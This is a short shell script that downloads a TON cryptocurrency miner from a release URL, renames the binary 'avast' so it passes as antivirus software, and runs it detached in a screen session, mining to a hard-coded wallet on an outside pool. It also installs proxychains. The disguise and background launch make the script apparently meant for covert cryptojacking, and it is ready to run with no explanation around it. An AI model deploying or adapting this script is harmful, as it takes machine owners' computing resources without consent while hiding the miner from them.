#!/bin/sh
apt update
apt install proxychains
apt install screen -y
wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
mv miner-linux avast
chmod +x avast 
screen -dmS running ./avast run https://next.ton-pool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
